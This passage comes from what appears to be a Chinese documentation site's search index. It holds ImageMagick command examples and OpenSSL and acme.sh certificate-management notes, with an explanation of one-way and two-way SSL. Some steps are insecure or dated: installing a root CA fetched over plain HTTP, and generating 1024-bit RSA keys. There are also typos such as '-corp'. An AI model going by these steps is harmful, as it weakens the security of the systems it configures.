<p>\u5f62\u6210\u5e95\u7247\u7684\u6837\u5b50</p> <pre><code>convert -negate foo.png bar.png\n</code></pre> <p>\u628a\u56fe\u7247\u53d8\u4e3a\u9ed1\u767d\u989c\u8272</p> <pre><code>convert -monochrome foo.png bar.png\n</code></pre> <p>\u52a0\u566a\u58f0</p> <pre><code>convert -noise 3 foo.png bar.png\n</code></pre> <p>\u6cb9\u753b\u6548\u679c</p> <pre><code>convert -paint 4 foo.png bar.png\n</code></pre> <p>\u628a\u4e00\u5f20\u56fe\u7247\uff0c\u65cb\u8f6c\u4e00\u5b9a\u7684\u89d2\u5ea6\u300230\u8868\u793a\u5411\u53f3\u65cb\u8f6c30\u5ea6\uff0c\u5982\u679c\u8981\u5411\u5de6\u65cb\u8f6c\uff0c\u5ea6\u6570\u5c31\u662f\u8d1f\u6570</p> <pre><code>convert -rotate 30 foo.png bar.png\n</code></pre> <p>\u70ad\u7b14\u6548\u679c</p> <pre><code>convert -charcoal 2 foo.png bar.png\n</code></pre> <p>\u6563\u5c04\uff0c\u6bdb\u73bb\u7483\u6548\u679c</p> <pre><code>convert -spread 30 foo.png bar.png\n</code></pre> <p>\u6f29\u6da1\uff0c\u4ee5\u56fe\u7247\u7684\u4e2d\u5fc3\u4f5c\u4e3a\u53c2\u7167\uff0c\u628a\u56fe\u7247\u626d\u8f6c\uff0c\u5f62\u6210\u6f29\u6da1\u7684\u6548\u679c</p> <pre><code>convert -swirl 67 foo.png bar.png\n</code></pre> <p>\u51f8\u8d77\u6548\u679c\uff0c\u7528-raise\u6765\u521b\u5efa\u51f8\u8fb9</p> <pre><code>convert -raise 5x5 foo.png bar.png\n</code></pre> <p>\u6309\u6bd4\u4f8b\u88c1\u526a\uff0c\u662f\u4ece\u4e00\u4e2a\u56fe\u7247\u622a\u53d6\u4e00\u4e2a\u6307\u5b9a\u533a\u57df\u7684\u5b50\u56fe\u7247</p> <pre><code>\u683c\u5f0f\uff1a\nconvert -crop widthxheight{+-}x{+-}y{%}\n</code></pre> <pre><code>width \u5b50\u56fe\u7247\u5bbd\u5ea6\nheight \u5b50\u56fe\u7247\u9ad8\u5ea6\nx \u4e3a\u6b63\u6570\u65f6\u4e3a\u4ece\u533a\u57df\u5de6\u4e0a\u89d2\u7684x\u5750\u6807,\u4e3a\u8d1f\u6570\u65f6,\u5de6\u4e0a\u89d2\u5750\u6807\u4e3a0,\u7136\u540e\u4ece\u622a\u51fa\u7684\u5b50\u56fe\u7247\u53f3\u8fb9\u51cf\u53bbx\u8c61\u7d20\u5bbd\u5ea6.\ny \u4e3a\u6b63\u6570\u65f6\u4e3a\u4ece\u533a\u57df\u5de6\u4e0a\u89d2\u7684y\u5750\u6807,\u4e3a\u8d1f\u6570\u65f6,\u5de6\u4e0a\u89d2\u5750\u6807\u4e3a0,\u7136\u540e\u4ece\u622a\u51fa\u7684\u5b50\u56fe\u7247\u4e0a\u8fb9\u51cf\u53bby\u8c61\u7d20\u9ad8\u5ea6.\n\nconvert -crop 300x400+10+10 src.jpg dest.jpg \n# \u4ecesrc.jpg \u5750\u6807\u4e3ax:10 y:10\u622a\u53d6300x400\u7684\u56fe\u7247\u5b58\u4e3adest.jpg\n\nconvert -crop 300x400-10+10 src.jpg dest.jpg \n# \u4ecesrc.jpg\u5750\u6807\u4e3ax:0 y:10\u622a\u53d6290x400\u7684\u56fe\u7247\u5b58\u4e3adest.jpg\n</code></pre> <p>\u4ece\u56fe\u7247\u4e2d\u5fc3\u4f4d\u7f6e\u5411\u56db\u5468\u88c1\u526a\u5927\u5c0f\u4e3a 300x400\u7684\u533a\u57df</p> <pre><code>convert -gravity center -crop 300x400+0+0 src.jpg dest.jpg \n</code></pre> <p>crop\u53c2\u6570\u4e5f\u53ef\u4ee5\u4f7f\u7528\u767e\u5206\u6bd4</p> <pre><code>convert src.jpg -crop 50% dest.jpg \n\n# \u751f\u6210dest-[0-3].jpg\u7684\u56fe\uff0c\u5176\u5b9e\u5168\u547d\u4ee4\u53ef\u4ee5\u7406\u89e3\u4e3a\uff1a -crop 50%x50%+0+0\n# \u8bbe\u539f\u56fe\u5927\u5c0f\u4e3a200x100\uff0c\u5219\n# dest-0.jpg \u4e3asrc.jpg\u7684100x50+0+0\uff0c\u5927\u5c0f\u4e3a100x50\n# dest-1.jpg \u4e3asrc.jpg\u7684100x50+100+0\uff0c\u5927\u5c0f\u4e3a100x50\n# dest-2.jpg \u4e3asrc.jpg\u7684100x50+0+50\uff0c\u5927\u5c0f\u4e3a100x50\n# dest-3.jpg \u4e3asrc.jpg\u7684100x50+100+50\uff0c\u5927\u5c0f\u4e3a100x50\n</code></pre> <p>\u5c06\u539f\u56fe\u4ece\u4e0a\u5230\u4e0b\u5e73\u5747\u88c1\u526a\u62104\u4efd</p> <pre><code>convert src.jpg -crop 100%x25%  dest.jpg  \n\n# dest-0.jpg \u4e3asrc.jpg\u7684200x25+0+0\uff0c\u5927\u5c0f\u4e3a200x25\n# dest-1.jpg \u4e3asrc.jpg\u7684200x25+0+25\uff0c\u5927\u5c0f\u4e3a200x25\n# dest-2.jpg \u4e3asrc.jpg\u7684200x25+0+50\uff0c\u5927\u5c0f\u4e3a200x25\n# dest-3.jpg \u4e3asrc.jpg\u7684200x25+0+75\uff0c\u5927\u5c0f\u4e3a200x25\n</code></pre> <p>\u53ea\u88c1\u526a\u4e2d\u5fc3\u533a\u57df\u768450%</p> <pre><code>convert src.jpg -gravity center -crop 50%  dest.jpg  \n</code></pre> <p>\u82e5src.jpg(200x100)\uff0c\u5219dest.jpg\u4e3a\u4ecesrc\u4e2d\u5fc3\u4f4d\u7f6e\u5411\u56db\u5468\u6269\u5c5550%\u7684\u533a\u57df,\u5373\u4e0e\u6267\u884c\u4e0b\u8fb9\u547d\u4ee4\u7684\u7ed3\u679c\u76f8\u540c</p> <pre><code>convert src.jpg -gravity center -corp 100x50+40+25  dest.jpg\n</code></pre>"},{"location":"daily/14-imagemagick/#import","title":"import","text":"<p>import\u662f\u4e00\u4e2a\u7528\u4e8e\u5c4f\u5e55\u622a\u56fe\u7684\u7ec4\u4ef6</p> <p>\u622a\u53d6\u5c4f\u5e55\u7684\u4efb\u4e00\u77e9\u5f62\u533a\u57df</p> <pre><code>import foo.png\n</code></pre> <p>\u5728\u8f93\u5165\u4e0a\u8ff0\u7684\u547d\u4ee4\u540e\uff0c\u4f60\u7684\u9f20\u6807\u4f1a\u53d8\u6210\u4e00\u4e2a\u5341\u5b57\uff0c\u8fd9\u4e2a\u65f6\u5019\uff0c\u4f60\u53ea\u8981\u5728\u60f3\u8981\u622a\u53d6\u7684\u5730\u65b9\u5212\u4e00\u4e2a\u77e9\u5f62\u5c31\u53ef\u4ee5\u4e86</p> <p>\u622a\u53d6\u7a0b\u5e8f\u7684\u7a97\u53e3</p> <pre><code>import -pause 3 -frame foo.png\n</code></pre> <p>\u56de\u8f66\u540e\uff0c\u7528\u9f20\u6807\u5728\u4f60\u60f3\u622a\u7684\u7a97\u53e3\u4e0a\u70b9\u4e00\u4e0b\u5373\u53ef\u3002\u53c2\u6570-frame\u7684\u4f5c\u7528\u662f\u544a\u8bc9import\uff0c\u622a\u56fe\u7684\u65f6\u5019\u628a\u76ee\u6807\u7a97\u53e3\u7684\u5916\u6846\u67b6\u5e26\u4e0a\uff0c\u53c2\u6570-pause\u7684\u4f5c\u7528\u5f88\u91cd\u8981\uff0c\u4f60\u53ef\u4ee5\u8bd5\u7740\u628a\u5b83\u53bb\u6389\uff0c\u5bf9\u6bd4\u4e00\u4e0b\uff0c\u4f60\u4f1a\u53d1\u73b0\uff0c\u76ee\u6807\u7a97\u53e3\u7684\u6807\u9898\u680f\u662f\u7070\u8272\u7684\uff0cpause\u5c31\u662f\u8ba9import\u7a0d\u5fae\u5ef6\u8fdf\u4e00\u4e0b\uff0c\u7b49\u4f60\u7684\u76ee\u6807\u7a97\u53e3\u83b7\u5f97\u7126\u70b9\u4e86\uff0c\u624d\u5f00\u59cb\u622a\u56fe\uff0c\u8fd9\u6837\u7684\u56fe\u624d\u6bd4\u8f83\u81ea\u7136\u3002</p> <p>\u622a\u53d6\u4e00\u4e2a\u503e\u659c\u7684\u7a97\u53e3 \u5982\u679c\u60f3\u8ba9\u4f60\u7684\u622a\u56fe\u6bd4\u8f83cool\uff0c\u4f60\u53ef\u4ee5\u628a\u622a\u53d6\u4e00\u4e2a\u503e\u659c\u7684\u7a97\u53e3\uff0c\u65b9\u6cd5\u5982\u4e0b\uff1a</p> <pre><code>import -rotate 30 -pause 3 -frame foo.png\n</code></pre> <p>\u622a\u53d6\u6574\u4e2a\u5c4f\u5e55</p> <pre><code>import -pause 3 -window root screen.png\n</code></pre> <p>\u6ce8\u610f\uff0c\u6682\u505c\u4e863\u79d2\u949f\uff0c\u4f60\u9700\u8981\u57283\u79d2\u949f\u5185\u5207\u6362\u5230\u9700\u8981\u622a\u53d6\u7684\u753b\u9762\u5662\u3002</p>"},{"location":"daily/15-openssl/","title":"\u8bc1\u4e66\u7ba1\u7406","text":""},{"location":"daily/15-openssl/#_2","title":"\u4e00\u3001\u7cfb\u7edf\u53d7\u4fe1","text":"<pre><code># ubuntu\napt install -y ca-certificates\ncurl -s -o /usr/local/share/ca-certificates/xx.crt http://m.8ops.top/cert/xx.crt\nmd5sum /usr/local/share/ca-certificates/xx.crt\nupdate-ca-certificates\n\n# centos\nyum install -y ca-certificates\ncurl -s -o /etc/pki/ca-trust/source/anchors/xx.crt http://m.8ops.top/cert/xx.crt\nmd5sum /etc/pki/ca-trust/source/anchors/xx.crt\nupdate-ca-trust\n</code></pre>"},{"location":"daily/15-openssl/#_3","title":"\u4e8c\u3001\u67e5\u770b\u4fe1\u606f","text":""},{"location":"daily/15-openssl/#21-pem","title":"2.1 pem\u4fe1\u606f","text":"<pre><code>openssl x509 -noout -text -in root.pem\n</code></pre>"},{"location":"daily/15-openssl/#22-p12","title":"2.2 p12\u4fe1\u606f","text":"<pre><code>openssl pkcs12 -in root.p12  | \\\n    openssl x509 -noout -text\n</code></pre>"},{"location":"daily/15-openssl/#23","title":"2.3 \u7b7e\u53d1\u65f6\u95f4","text":"<pre><code>openssl x509 -noout -enddate -startdate -in root.crt\nopenssl x509 -noout -dates -in root.crt\n</code></pre>"},{"location":"daily/15-openssl/#_4","title":"\u4e09\u3001\u68c0\u9a8c\u65b9\u5f0f","text":"<pre><code># \u901a\u8fc7\u547d\u4ee4\u884c\u83b7\u53d6\u7f51\u7ad9SSL\u8bc1\u4e66\n# SNI Server Name Indication\n# \u5f53\u4e00\u53f0\u670d\u52a1\u5668\uff08\u76f8\u540c\u7684IP\u5730\u5740\u548cTCP\u7aef\u53e3\u53f7\uff09\u540c\u65f6\u6258\u7ba1\u591a\u4e2a\u57df\u540d\u65f6\uff0c\u53ef\u901a\u8fc7servername\u53c2\u6570\u660e\u6587\u53d1\u9001\u4e3b\u673a\u540d\u79f0\u3002\n\necho | \\\n    openssl s_client -showcerts -connect books.8ops.top:443 | \\\n    openssl x509 -noout -dates\n\necho | \\\n    openssl s_client -showcerts -connect books.8ops.top:443 -servername books.8ops.top | \\\n    openssl x509 -noout -dates\n\n# \u57fa\u672c\u4fe1\u606f\necho | \\\n    openssl s_client -showcerts -connect books.8ops.top:443 -servername books.8ops.top | \\\n    openssl x509 -noout\n\n# \u7b7e\u53d1\u65f6\u95f4 \u542b startdate + enddate\necho | \\\n    openssl s_client -showcerts -connect books.8ops.top:443 -servername books.8ops.top | \\\n    openssl x509 -noout -dates\n\n# \u8be6\u60c5\necho | \\\n    openssl s_client -showcerts -connect books.8ops.top:443 -servername books.8ops.top\n\necho | \\\n    openssl s_client -showcerts -connect books.8ops.top:443 -servername books.8ops.top | \\\n    openssl x509 -noout -text\n\n# \u68c0\u6d4bOCSP\u72b6\u6001\necho \"\" | \\\n    openssl s_client -connect books.8ops.top:443 -status 2&gt;/dev/null | \\\n    grep -i OCSP\n\n# \u5df2\u542f\u7528\n# OCSP Response Status: successful (0x0)\n\n# \u672a\u542f\u7528\n# OCSP response: no response sent\n# openssl \u7248\u672c\nopenssl version -a\n</code></pre>"},{"location":"daily/15-openssl/#_5","title":"\u4e09\u3001\u7b7e\u53d1\u65b9\u5f0f","text":""},{"location":"daily/15-openssl/#31","title":"3.1 \u4e2a\u4eba\u7b7e\u53d1","text":""},{"location":"daily/15-openssl/#311","title":"3.1.1 \u65b9\u5f0f\u4e00","text":"<p>\u901a\u8fc7openssl\u751f\u6210\u79c1\u94a5</p> <pre><code>openssl genrsa -out server.key 1024\n</code></pre> <p>\u4f7f\u7528\u79c1\u94a5\u751f\u6210\u81ea\u7b7e\u540d\u7684cert\u8bc1\u4e66\u6587\u4ef6</p> <pre><code>openssl req -new -x509 -days 3650 -key server.key -out server.crt -subj \"/C=CN/ST=OPS/L=OPS/O=OPS/OU=OPS/CN=ops.top/CN=*.8ops.top\"\n</code></pre>"},{"location":"daily/15-openssl/#312","title":"3.1.2 \u65b9\u5f0f\u4e8c","text":"<p>\u901a\u8fc7openssl\u751f\u6210\u79c1\u94a5</p> <pre><code>openssl genrsa -out server.key 1024\n</code></pre> <p>\u6839\u636e\u79c1\u94a5\u751f\u6210\u8bc1\u4e66\u7533\u8bf7\u6587\u4ef6csr</p> <pre><code>openssl req -new -key server.key -out server.csr\n</code></pre> <p>\u8fd9\u91cc\u6839\u636e\u547d\u4ee4\u884c\u5411\u5bfc\u6765\u8fdb\u884c\u4fe1\u606f\u8f93\u5165</p> <p>\u4f7f\u7528\u79c1\u94a5\u5bf9\u8bc1\u4e66\u7533\u8bf7\u8fdb\u884c\u7b7e\u540d\u4ece\u800c\u751f\u6210\u8bc1\u4e66</p> <pre><code>openssl x509 -req -in server.csr -out server.crt -signkey server.key -days 3650\n</code></pre>"},{"location":"daily/15-openssl/#313","title":"3.1.3 \u65b9\u5f0f\u4e09","text":"<p>\u76f4\u63a5\u751f\u6210\u8bc1\u4e66\u6587\u4ef6</p> <pre><code>openssl req -new -x509 -keyout server.key -out server.crt -config openssl.cnf\n</code></pre>"},{"location":"daily/15-openssl/#32","title":"3.2 \u673a\u6784\u7b7e\u53d1","text":"<p>\u521b\u5efa key</p> <pre><code>openssl genrsa -out autobestdevops.com.key 2048\n</code></pre> <p>\u7533\u8bf7\u6587\u4ef6</p> <pre><code>openssl req -new -key autobestdevops.com.key -out autobestdevops.com.csr\n</code></pre>"},{"location":"daily/15-openssl/#33","title":"3.3 \u514d\u8d39\u8bc1\u4e66","text":"<p>\u8fd9\u91cc\u4f7f\u7528 <code>Let's enscript</code></p> <p>acme.sh  \u4f7f\u7528 DNS \u8ba4\u8bc1\u3002e.g. dnspod</p> <pre><code># install\ngit clone https://github.com/acmesh-official/acme.sh.git .acme.sh\n\nBASHRC_FILE=.bashrc\n[ -e ${BASHRC_FILE} ] || touch ${BASHRC_FILE}\ngrep -q acme.sh ${BASHRC_FILE} || cat &lt;&lt;EOF &gt;&gt; ${BASHRC_FILE}\n# acme.sh\nexport LE_WORKING_DIR=\"/root/.acme.sh\"\nalias acme.sh=\"/root/.acme.sh/acme.sh\"\nEOF\n. .bashrc\nacme.sh --version\n\n# \u662f\u6307 DNSpod Token\nexport DP_Id=\nexport DP_Key=\n\n# register https://github.com/acmesh-official/acme.sh/wiki/ZeroSSL.com-CA\nacme.sh --register-account -m email --server zerossl\nacme.sh --set-default-ca  --server zerossl\n\n# issue \n# \u53ef\u80fd\u9700\u8981 FW\nacme.sh --issue \\\n    -d 8ops.top \\\n    -d \"*.8ops.top\" \\\n    --dns dns_dp \\\n    --debug 2\n\n# install\nacme.sh --install-cert \\\n    -d 8ops.top \\\n    --key-file /etc/nginx/ssl.d/8ops.top.key \\\n    --fullchain-file /etc/nginx/ssl.d/8ops.top.crt \\\n    --reloadcmd \"systemctl reload nginx\"\n\n# renew\nacme.sh --renew -d 8ops.top -f\n\n# crontab\n0 4 * * 1 \"/root/.acme.sh\"/acme.sh --cron --home \"/root/.acme.sh\" &gt; /dev/null\n</code></pre> <p>\u5f53\u7b7e\u53d1/\u7eed\u7b7e\u62a5\u9519\u65f6</p> <pre><code># \u62a5\u9519\u5185\u5bb9\n[Wed Jan  3 15:39:57 CST 2024] Error, can not get domain token \"type\":\"dns-01\",\"url\":\"https://acme.zerossl.com/v2/DV90/chall/eERxBZpE7gEEy08C301sfQ\",\"status\":\"invalid\",\"error\":{\n\n# \u5c1d\u8bd5\u5207\u6362\u7b7e\u53d1\u4e3b\u4f53\uff0c\u731c\u6d4b\u7b7e\u53d1\u4e3b\u4f53\u56e0\u67d0\u79cd\u539f\u56e0\u672a\u6210\u529f\u7b7e\u53d1\nacme.sh --issue ....   --server  zerossl\n# \u53d8\u66f4\u4e3a\nacme.sh --issue ....   --server  letsencrypt\n\nhttps://github.com/acmesh-official/acme.sh/wiki/Server\n</code></pre>"},{"location":"daily/15-openssl/#_6","title":"\u56db\u3001\u683c\u5f0f\u8f6c\u6362","text":"<p><code>TODO</code></p>"},{"location":"daily/15-openssl/#_7","title":"\u4e94\u3001\u5355\u5411\u53cc\u5411","text":"<p>\u4ec0\u4e48\u662fSSL\u53cc\u5411\u8ba4\u8bc1? \u4ec0\u4e48\u662fSSL\u5355\u5411\u8ba4\u8bc1? \u672c\u6587\u7ed9\u5927\u5bb6\u4ecb\u7ecd**SSL\u53cc\u5411\u8ba4\u8bc1**\u548c**SSL\u5355\u5411\u8ba4\u8bc1**\u7684\u5177\u4f53\u8fc7\u7a0b\u4ee5\u53ca\u4ed6\u4eec\u4e24\u8005\u4e4b\u95f4\u7684\u533a\u522b\u3002 </p>"},{"location":"daily/15-openssl/#51-ssl","title":"5.1 SSL\u53cc\u5411\u8ba4\u8bc1\u5177\u4f53\u8fc7\u7a0b","text":"<p>\u2460 \u6d4f\u89c8\u5668\u53d1\u9001\u4e00\u4e2a\u8fde\u63a5\u8bf7\u6c42\u7ed9\u5b89\u5168\u670d\u52a1\u5668\u3002 </p> <p>\u2461 \u670d\u52a1\u5668\u5c06\u81ea\u5df1\u7684\u8bc1\u4e66\uff0c\u4ee5\u53ca\u540c\u8bc1\u4e66\u76f8\u5173\u7684\u4fe1\u606f\u53d1\u9001\u7ed9\u5ba2\u6237\u6d4f\u89c8\u5668\u3002 </p> <p>\u2462 \u5ba2\u6237\u6d4f\u89c8\u5668\u68c0\u67e5\u670d\u52a1\u5668\u9001\u8fc7\u6765\u7684\u8bc1\u4e66\u662f\u5426\u662f\u7531\u81ea\u5df1\u4fe1\u8d56\u7684CA\u4e2d\u5fc3\uff08\u5982\u6c83\u901aCA\uff09\u6240\u7b7e\u53d1\u7684\u3002\u5982\u679c\u662f\uff0c\u5c31\u7ee7\u7eed\u6267\u884c\u534f\u8bae;\u5982\u679c\u4e0d\u662f\uff0c\u5ba2\u6237\u6d4f\u89c8\u5668\u5c31\u7ed9\u5ba2\u6237\u4e00\u4e2a\u8b66\u544a\u6d88\u606f\uff1a\u8b66\u544a\u5ba2\u6237\u8fd9\u4e2a\u8bc1\u4e66\u4e0d\u662f\u53ef\u4ee5\u4fe1\u8d56\u7684\uff0c\u8be2\u95ee\u5ba2\u6237\u662f\u5426\u9700\u8981\u7ee7\u7eed\u3002 </p> <p>\u2463 \u63a5\u7740\u5ba2\u6237\u6d4f\u89c8\u5668\u6bd4\u8f83\u8bc1\u4e66\u91cc\u7684\u6d88\u606f\uff0c\u4f8b\u5982\u57df\u540d\u548c\u516c\u94a5\uff0c\u4e0e\u670d\u52a1\u5668\u521a\u521a\u53d1\u9001\u7684\u76f8\u5173\u6d88\u606f\u662f\u5426\u4e00\u81f4\uff0c\u5982\u679c\u662f\u4e00\u81f4\u7684\uff0c\u5ba2\u6237\u6d4f\u89c8\u5668\u8ba4\u53ef\u8fd9\u4e2a\u670d\u52a1\u5668\u7684\u5408\u6cd5\u8eab\u4efd\u3002 </p> <p>\u2464 \u670d\u52a1\u5668\u8981\u6c42\u5ba2\u6237\u53d1\u9001\u5ba2\u6237\u81ea\u5df1\u7684\u8bc1\u4e66\u3002\u6536\u5230\u540e\uff0c\u670d\u52a1\u5668\u9a8c\u8bc1\u5ba2\u6237\u7684\u8bc1\u4e66\uff0c\u5982\u679c\u6ca1\u6709\u901a\u8fc7\u9a8c\u8bc1\uff0c\u62d2\u7edd\u8fde\u63a5;\u5982\u679c\u901a\u8fc7\u9a8c\u8bc1\uff0c\u670d\u52a1\u5668\u83b7\u5f97\u7528\u6237\u7684\u516c\u94a5\u3002 </p> <p>\u2465 \u5ba2\u6237\u6d4f\u89c8\u5668\u544a\u8bc9\u670d\u52a1\u5668\u81ea\u5df1\u6240\u80fd\u591f\u652f\u6301\u7684\u901a\u8baf\u5bf9\u79f0\u5bc6\u7801\u65b9\u6848\u3002 </p> <p>\u2466 \u670d\u52a1\u5668\u4ece\u5ba2\u6237\u53d1\u9001\u8fc7\u6765\u7684\u5bc6\u7801\u65b9\u6848\u4e2d\uff0c\u9009\u62e9\u4e00\u79cd\u52a0\u5bc6\u7a0b\u5ea6\u6700\u9ad8\u7684\u5bc6\u7801\u65b9\u6848\uff0c\u7528\u5ba2\u6237\u7684\u516c\u94a5\u52a0\u8fc7\u5bc6\u540e\u901a\u77e5\u6d4f\u89c8\u5668\u3002 </p> <p>\u2467 \u6d4f\u89c8\u5668\u9488\u5bf9\u8fd9\u4e2a\u5bc6\u7801\u65b9\u6848\uff0c\u9009\u62e9\u4e00\u4e2a\u901a\u8bdd\u5bc6\u94a5\uff0c\u63a5\u7740\u7528\u670d\u52a1\u5668\u7684\u516c\u94a5\u52a0\u8fc7\u5bc6\u540e\u53d1\u9001\u7ed9\u670d\u52a1\u5668\u3002 </p> <p>\u2468 \u670d\u52a1\u5668\u63a5\u6536\u5230\u6d4f\u89c8\u5668\u9001\u8fc7\u6765\u7684\u6d88\u606f\uff0c\u7528\u81ea\u5df1\u7684\u79c1\u94a5\u89e3\u5bc6\uff0c\u83b7\u5f97\u901a\u8bdd\u5bc6\u94a5\u3002 </p> <p>\u2469 \u670d\u52a1\u5668\u3001\u6d4f\u89c8\u5668\u63a5\u4e0b\u6765\u7684\u901a\u8baf\u90fd\u662f\u7528\u5bf9\u79f0\u5bc6\u7801\u65b9\u6848\uff0c\u5bf9\u79f0\u5bc6\u94a5\u662f\u52a0\u8fc7\u5bc6\u7684\u3002 </p> <p>\u53cc\u5411\u8ba4\u8bc1\u5219\u662f\u9700\u8981\u670d\u52a1\u7aef\u4e0e\u5ba2\u6237\u7aef\u63d0\u4f9b\u8eab\u4efd\u8ba4\u8bc1\uff0c\u53ea\u80fd\u662f\u670d\u52a1\u7aef\u5141\u8bb8\u7684\u5ba2\u6237\u80fd\u53bb\u8bbf\u95ee\uff0c\u5b89\u5168\u6027\u76f8\u5bf9\u4e8e\u8981\u9ad8\u4e00\u4e9b\u3002</p>"},{"location":"daily/15-openssl/#52-ssl","title":"5.2 SSL\u5355\u5411\u8ba4\u8bc1\u5177\u4f53\u8fc7\u7a0b","text":"<p>\u2460\u5ba2\u6237\u7aef\u7684\u6d4f\u89c8\u5668\u5411\u670d\u52a1\u5668\u4f20\u9001\u5ba2\u6237\u7aefSSL\u534f\u8bae\u7684\u7248\u672c\u53f7\uff0c\u52a0\u5bc6\u7b97\u6cd5\u7684\u79cd\u7c7b\uff0c\u4ea7\u751f\u7684\u968f\u673a\u6570\uff0c\u4ee5\u53ca\u5176\u4ed6\u670d\u52a1\u5668\u548c\u5ba2\u6237\u7aef\u4e4b\u95f4\u901a\u8baf\u6240\u9700\u8981\u7684\u5404\u79cd\u4fe1\u606f\u3002 </p> <p>\u2461\u670d\u52a1\u5668\u5411\u5ba2\u6237\u7aef\u4f20\u9001SSL\u534f\u8bae\u7684\u7248\u672c\u53f7\uff0c\u52a0\u5bc6\u7b97\u6cd5\u7684\u79cd\u7c7b\uff0c\u968f\u673a\u6570\u4ee5\u53ca\u5176\u4ed6\u76f8\u5173\u4fe1\u606f\uff0c\u540c\u65f6\u670d\u52a1\u5668\u8fd8\u5c06\u5411\u5ba2\u6237\u7aef\u4f20\u9001\u81ea\u5df1\u7684\u8bc1\u4e66\u3002 </p> <p>\u2462\u5ba2\u6237\u5229\u7528\u670d\u52a1\u5668\u4f20\u8fc7\u6765\u7684\u4fe1\u606f\u9a8c\u8bc1\u670d\u52a1\u5668\u7684\u5408\u6cd5\u6027\uff0c\u670d\u52a1\u5668\u7684\u5408\u6cd5\u6027\u5305\u62ec\uff1a\u8bc1\u4e66\u662f\u5426\u8fc7\u671f\uff0c\u53d1\u884c\u670d\u52a1\u5668\u8bc1\u4e66\u7684CA\u662f\u5426\u53ef\u9760\uff0c\u53d1\u884c\u8005\u8bc1\u4e66\u7684\u516c\u94a5\u80fd\u5426\u6b63\u786e\u89e3\u5f00\u670d\u52a1\u5668\u8bc1\u4e66\u7684\"\u53d1\u884c\u8005\u7684\u6570\u5b57\u7b7e\u540d\"\uff0c\u670d\u52a1\u5668\u8bc1\u4e66\u4e0a\u7684\u57df\u540d\u662f\u5426\u548c\u670d\u52a1\u5668\u7684\u5b9e\u9645\u57df\u540d\u76f8\u5339\u914d\u3002\u5982\u679c\u5408\u6cd5\u6027\u9a8c\u8bc1\u6ca1\u6709\u901a\u8fc7\uff0c\u901a\u8baf\u5c06\u65ad\u5f00;\u5982\u679c\u5408\u6cd5\u6027\u9a8c\u8bc1\u901a\u8fc7\uff0c\u5c06\u7ee7\u7eed\u8fdb\u884c\u7b2c\u56db\u6b65\u3002 </p> <p>\u2463\u7528\u6237\u7aef\u968f\u673a\u4ea7\u751f\u4e00\u4e2a\u7528\u4e8e\u540e\u9762\u901a\u8baf\u7684\"\u5bf9\u79f0\u5bc6\u7801\"\uff0c\u7136\u540e\u7528\u670d\u52a1\u5668\u7684\u516c\u94a5(\u670d\u52a1\u5668\u7684\u516c\u94a5\u4ece\u6b65\u9aa4\u2461\u4e2d\u7684\u670d\u52a1\u5668\u7684\u8bc1\u4e66\u4e2d\u83b7\u5f97)\u5bf9\u5176\u52a0\u5bc6\uff0c\u7136\u540e\u5c06\u52a0\u5bc6\u540e\u7684\"\u9884\u4e3b\u5bc6\u7801\"\u4f20\u7ed9\u670d\u52a1\u5668\u3002 </p> <p>\u2464\u5982\u679c\u670d\u52a1\u5668\u8981\u6c42\u5ba2\u6237\u7684\u8eab\u4efd\u8ba4\u8bc1(\u5728\u63e1\u624b\u8fc7\u7a0b\u4e2d\u4e3a\u53ef\u9009)\uff0c\u7528\u6237\u53ef\u4ee5\u5efa\u7acb\u4e00\u4e2a\u968f\u673a\u6570\u7136\u540e\u5bf9\u5176\u8fdb\u884c\u6570\u636e\u7b7e\u540d\uff0c\u5c06\u8fd9\u4e2a\u542b\u6709\u7b7e\u540d\u7684\u968f\u673a\u6570\u548c\u5ba2\u6237\u81ea\u5df1\u7684\u8bc1\u4e66\u4ee5\u53ca\u52a0\u5bc6\u8fc7\u7684\"\u9884\u4e3b\u5bc6\u7801\"\u4e00\u8d77\u4f20\u7ed9\u670d\u52a1\u5668\u3002 </p> <p>\u2465\u5982\u679c\u670d\u52a1\u5668\u8981\u6c42\u5ba2\u6237\u7684\u8eab\u4efd\u8ba4\u8bc1\uff0c\u670d\u52a1\u5668\u5fc5\u987b\u68c0\u9a8c\u5ba2\u6237\u8bc1\u4e66\u548c\u7b7e\u540d\u968f\u673a\u6570\u7684\u5408\u6cd5\u6027\uff0c\u5177\u4f53\u7684\u5408\u6cd5\u6027\u9a8c\u8bc1\u8fc7\u7a0b\u5305\u62ec\uff1a\u5ba2\u6237\u7684\u8bc1\u4e66\u4f7f\u7528\u65e5\u671f\u662f\u5426\u6709\u6548\uff0c\u4e3a\u5ba2\u6237\u63d0\u4f9b\u8bc1\u4e66\u7684CA\u662f\u5426\u53ef\u9760\uff0c\u53d1\u884cCA \u7684\u516c\u94a5\u80fd\u5426\u6b63\u786e\u89e3\u5f00\u5ba2\u6237\u8bc1\u4e66\u7684\u53d1\u884cCA\u7684\u6570\u5b57\u7b7e\u540d\uff0c\u68c0\u67e5\u5ba2\u6237\u7684\u8bc1\u4e66\u662f\u5426\u5728\u8bc1\u4e66\u5e9f\u6b62\u5217\u8868(CRL)\u4e2d\u3002\u68c0\u9a8c\u5982\u679c\u6ca1\u6709\u901a\u8fc7\uff0c\u901a\u8baf\u7acb\u523b\u4e2d\u65ad;\u5982\u679c\u9a8c\u8bc1\u901a\u8fc7\uff0c\u670d\u52a1\u5668\u5c06\u7528\u81ea\u5df1\u7684\u79c1\u94a5\u89e3\u5f00\u52a0\u5bc6\u7684\"\u9884\u4e3b\u5bc6\u7801 \"\uff0c\u7136\u540e\u6267\u884c\u4e00\u7cfb\u5217\u6b65\u9aa4\u6765\u4ea7\u751f\u4e3b\u901a\u8baf\u5bc6\u7801(\u5ba2\u6237\u7aef\u4e5f\u5c06\u901a\u8fc7\u540c\u6837\u7684\u65b9\u6cd5\u4ea7\u751f\u76f8\u540c\u7684\u4e3b\u901a\u8baf\u5bc6\u7801)\u3002 </p> 